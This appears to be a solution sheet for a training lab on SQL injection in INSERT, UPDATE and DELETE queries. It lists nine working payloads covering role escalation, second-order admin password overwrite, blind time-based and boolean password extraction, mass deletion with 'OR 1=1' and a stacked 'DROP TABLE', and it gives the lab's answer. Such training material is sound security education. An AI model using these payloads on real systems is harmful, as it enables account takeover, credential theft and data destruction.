INSERT Labs
Lab 1 — Register as Admin
Username: anything', 'x@x.com', 'pass', 'admin')--
Email: attacker@evil.com
Password: hacked
Closes the VALUES early and injects your own role column before the comment kills the rest.

Lab 2 — Second-Order: Poison the Username
Username: admin'--
New password: pwned
The username gets safely stored. When the app later runs UPDATE users SET password='pwned' WHERE username='admin'--' — the -- kills the real WHERE and updates admin's row instead of yours.

Lab 3 — INSERT Exfil via Reflected Field
Username: '||(SELECT @@version)||'
Email: x@x.com
Password: pass
The subquery executes inside the INSERT and the DB version gets stored as your username, then reflected back on the profile page.

UPDATE Labs
Lab 4 — Change Another User's Password
Email: alice@corp.com
Password: hacked' WHERE id=1--
Closes the password string early, injects a new WHERE targeting admin (id=1), and comments out the original WHERE id=2.

Lab 5 — Escalate Your Own Role
Email: x@x.com', role='admin', password='irrelevant
Password: bob456
Injects an extra SET column assignment. The query becomes SET email='x@x.com', role='admin', password='irrelevant', password='bob456' — role gets updated even though the form never exposed it.

Lab 6 — Blind UPDATE Time-Based
Email: bob@corp.com
Password: pass', email=IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='S',SLEEP(5),0) WHERE id=3--
If the first char of admin's password is S, the DB sleeps 5 seconds. Instant response = wrong char. Iterate through the alphabet for every position to rebuild the full password. (Answer: S3cr3t!Pass)

DELETE Labs
Lab 7 — Delete All Records
Feedback ID: 1 OR 1=1--
OR 1=1 makes the WHERE always true. Every row in the feedback table matches and gets deleted, not just yours.

Lab 8 — Stacked Query: Drop Table
Order ID: 1; DROP TABLE products--
Semicolon terminates the DELETE, then a second statement executes and wipes the entire products table.

Lab 9 — Conditional DELETE Blind Exfil
Order ID: 2 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='S'--
If admin's password starts with S (it does), the condition is TRUE and order id=2 gets deleted. Wrong char = no deletion. You now have a yes/no oracle to extract data one character at a time without any visible output.
